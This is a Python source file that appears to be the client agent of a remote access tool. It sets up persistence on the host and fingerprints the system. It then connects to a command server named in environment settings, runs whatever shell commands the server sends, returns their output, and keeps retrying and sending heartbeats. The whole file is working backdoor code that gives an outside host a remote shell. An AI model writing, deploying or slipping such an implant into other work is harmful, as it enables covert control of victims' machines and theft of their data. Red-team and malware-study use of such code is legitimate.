import os
import socket
import time
from dotenv import load_dotenv
from data import get_system_info
from shell import run_command
from helper import send_json, receive_json
from persistence import setup_persistence

load_dotenv("../../.env")

SERVER_HOST = os.getenv("SERVER_HOST")
SERVER_PORT = int(os.getenv("SERVER_PORT"))

MAX_TIMEOUT = int(os.getenv("AGENT_SEND_HEARTBEAT_INTERVAL"))  # Send heartbeat interval.
RETRY_CONNECT_INTERVAL = int(os.getenv("AGENT_RETRY_CONNECTION_INTERVAL"))  # Retry connection interval.

EXE_LOCATION, AGENT_ID_LOCATION = setup_persistence()  # Setup persistence and return exe and agent ID locations.


def read_uuid() -> str | None:

    if os.path.exists(AGENT_ID_LOCATION):
        with open(AGENT_ID_LOCATION, "r") as f:
            data = f.read()
            if data:
                return data
            else:
                return None

    return None

def communicate(s: socket.socket, initial_connection_info: dict) -> None:

    while True:
        # Read agent_id
        agent_id = read_uuid()
        if agent_id:
            initial_connection_info["agent_id"] = agent_id

        # Send system info
        send_json(s, initial_connection_info)

        # Receive
        agent_uid = receive_json(s)

        # Save to file received agent_id
        with open(AGENT_ID_LOCATION, "w") as f:
            f.write(agent_uid)

        while True:
            try:
                message = receive_json(s)
                if message is None:
                    print("Server disconnected.")
                    s.close()
                    main()

                response_tuple = run_command(message["command"])
                response = {
                    "type": "command_response",
                    "command_id": message["command_id"],
                    "command_response": response_tuple[0],
                    "cwd":  response_tuple[1],
                }
                send_json(s, response)

            except socket.timeout:  # If socket timeout, send heartbeat
                message = {
                    "type": "heartbeat",
                }
                send_json(s, message)
                print("Heartbeat sent.")

            except Exception as e:
                print(e)
                s.close()
                main()

def connect_to_server(host: str, port: int) -> socket.socket:
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            print("Connection established")
            return s
        except socket.error:
            print(f"Failed to connect to server, retrying in {RETRY_CONNECT_INTERVAL} seconds.")
            time.sleep(RETRY_CONNECT_INTERVAL)

def main() -> None:
    s = connect_to_server(SERVER_HOST, SERVER_PORT)
    s.settimeout(MAX_TIMEOUT)
    communicate(s, get_system_info())

if __name__ == '__main__':
    main()
